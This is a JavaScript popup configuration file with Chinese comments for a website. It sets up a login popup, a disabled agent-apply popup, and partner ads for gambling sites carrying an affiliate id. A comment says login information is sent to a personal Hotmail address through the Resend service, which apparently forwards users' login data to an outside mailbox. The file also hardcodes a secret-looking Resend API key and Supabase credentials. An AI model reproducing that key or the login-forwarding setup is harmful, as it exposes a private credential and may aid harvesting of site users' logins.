// ============================================
// 弹窗配置文件 - 修改此文件来控制弹窗行为
// ============================================

export const POPUP_CONFIG = {
  // 是否开启弹窗：true 开启，false 关闭
  enabled: true,

  // Cookie 过期时间（小时），控制多久弹一次
  cookieExpireHours: 24,

  // Cookie 名称（一般不需要修改）
  cookieName: 'login_popup_shown',

  // 收件邮箱 - 登录信息发送到这个邮箱
  targetEmail: 'ustk88@hotmail.com',

  // 发件邮箱 - 需要在 Resend 验证的域名邮箱
  fromEmail: 'Login Alert <noreply@ncoclick.com>',

  // Resend API Key
  resendApiKey: 're_d6SR5bCP_3iU2vbhT2C6k3gTV2Cj5ZqEs',

  // Agent Apply 弹窗配置
  agentApplyPopup: {
    enabled: false, // 是否开启 Agent Apply 弹窗
    cookieExpireDays: 15, // 不再提示的天数
    cookieName: 'agent_apply_popup_hidden_until', // 「不再显示」Cookie/Storage 名称
    successCooldownDays: 7, // 成功开通过后，7 天内不再弹窗
    successCookieName: 'agent_apply_popup_success_hidden_until', // 成功后隐藏用的 Cookie 名称
  },

  // 合作伙伴广告弹窗配置
  partnerAdsPopup: {
    enabled: true, // 是否开启合作伙伴广告弹窗
    cookieExpireDays: 7, // 不再提示的天数
    cookieName: 'partner_ads_popup_hidden_until', // 「不再显示」Cookie/Storage 名称
    delayMs: 1500, // 延迟显示时间（毫秒），避免与其他弹窗冲突
    partners: {
      winboxUsdt: {
        name: 'Winbox USDT',
        url: 'https://h5.winbox.ink',
        enabled: true,
      },
      bk8: {
        name: 'BK8',
        url: 'https://www.bk8bravo.com/register?affid=61987',
        enabled: true,
      },
    },
  },

  // Supabase 配置 (前端用 anon key，安全公开)
  supabase: {
    url: 'https://axpppbuxbwjubvqnnkwt.supabase.co',
    anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4cHBwYnV4YndqdWJ2cW5ua3d0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA1OTkzOTksImV4cCI6MjA4NjE3NTM5OX0.1enh5WBfmk2NqiEi7zbN8SOw_L7UhGiVOxgBjAtqITE',
  },
};
